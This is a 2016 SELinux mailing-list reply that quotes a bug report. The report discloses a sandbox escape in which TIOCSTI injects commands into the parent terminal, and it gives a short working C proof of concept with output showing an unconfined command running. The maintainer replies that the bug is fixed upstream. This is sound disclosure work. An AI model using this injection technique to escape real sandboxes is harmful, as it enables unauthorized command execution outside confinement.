Subject: Re: SELinux sandbox escape via TIOCSTI ioctl
To: up201407890@alunos.dcc.fc.up.pt, selinux@tycho.nsa.gov,
 Paul Moore <paul@paul-moore.com>
References: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
From: Stephen Smalley <sds@tycho.nsa.gov>
Message-ID: <e6efcd0b-27cd-de33-d111-bc2bcb1dc0b1@tycho.nsa.gov>
Date: Fri, 23 Sep 2016 16:14:12 -0400
MIME-Version: 1.0
In-Reply-To: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
Content-Type: text/plain; charset=utf-8
List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
 <selinux.tycho.nsa.gov>
List-Post: <mailto:selinux@tycho.nsa.gov>
List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>

On 09/23/2016 05:23 AM, up201407890@alunos.dcc.fc.up.pt wrote:
> Hi,
> 
> When executing a program via the SELinux sandbox, the nonpriv session
> can escape to the parent session by using the TIOCSTI ioctl to push
> characters into the terminal's input buffer, allowing an attacker to
> escape the sandbox.
> 
> $ cat test.c
> #include <unistd.h>
> #include <sys/ioctl.h>
> 
> int main()
> {
>   char *cmd = "id\n";
>   while(*cmd)
>    ioctl(0, TIOCSTI, cmd++);
>   execlp("/bin/id", "id", NULL);
> }
> 
> $ gcc test.c -o test
> $ /bin/sandbox ./test
> id
> uid=1000 gid=1000 groups=1000
> context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
> $ id    <------ did not type this
> uid=1000(saken) gid=1000(saken) groups=1000(saken)
> context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
> 
> 
> This is similar to CVE-2016-2568, CVE-2016-2779, etc.

Thank you for the bug report. This bug is now fixed in upstream commit
acca96a135a4d2a028ba9b636886af99c0915379.
